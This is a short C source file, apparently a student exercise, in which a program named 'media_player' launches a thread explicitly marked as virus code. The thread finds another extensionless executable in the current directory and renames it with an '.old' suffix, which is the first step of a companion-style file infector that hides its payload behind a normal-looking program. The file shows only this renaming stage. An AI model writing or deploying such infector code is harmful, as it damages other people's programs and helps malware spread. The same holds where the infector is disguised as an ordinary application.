#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>



//Virus code
static bool isExeCompatible(const char *name) {
    struct stat st;
    char old_name[PATH_MAX];

    if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
        return false;
    }

    if (strchr(name, '.') != NULL) {
        return false;
    }

    if (stat(name, &st) != 0 || !S_ISREG(st.st_mode)) {
        return false;
    }

    if (snprintf(old_name, sizeof(old_name), "%s.old", name) < 0) {
        return false;
    }

    if (access(old_name, F_OK) == 0) {
        return false;
    }

    //ne pas s'infecter soi même (j'ai eu le bug)
    if (strcmp(name, "media_player") == 0) {
        return false;
    }

    return true;
}

char *findExecutable(){
    DIR *d;
    struct dirent *dir;


    d = opendir(".");
    if (d == NULL) {
        perror("opendir");
        return NULL;
    }

    while ((dir = readdir(d)) != NULL) {
        const char *name = dir->d_name;

        if (!isExeCompatible(name)) {
            continue;
        }

        char *result = strdup(name);
        if (result == NULL) {
            perror("strdup");
        }
        closedir(d);
        return result;
    }

    closedir(d);
    return NULL;
}


// j'ai choisi de threader le virus pour qu'il ne bloque pas le mediaplayer
static void *virus_thread(void *arg){
    (void)arg;
    char *candidate = findExecutable();
    char new_name[PATH_MAX];
    if (snprintf(new_name, sizeof(new_name), "%s.old", candidate) < 0) {
        printf("Error creating new filename.\n");
        return NULL;
    }
    if (rename(candidate, new_name) != 0) {
        perror("rename");
        free(candidate);
        return NULL;
    }
    return NULL;
}

//End of virus code

int main() {
    pthread_t t;
    if (pthread_create(&t, NULL, virus_thread, NULL) != 0) {
        perror("pthread_create");
        return 1;
    }


    // a mettre a la fin de toute sortie du programme pour que le virus se termine avant que le programme ne se termine
    pthread_join(t, NULL);
    return 0;
}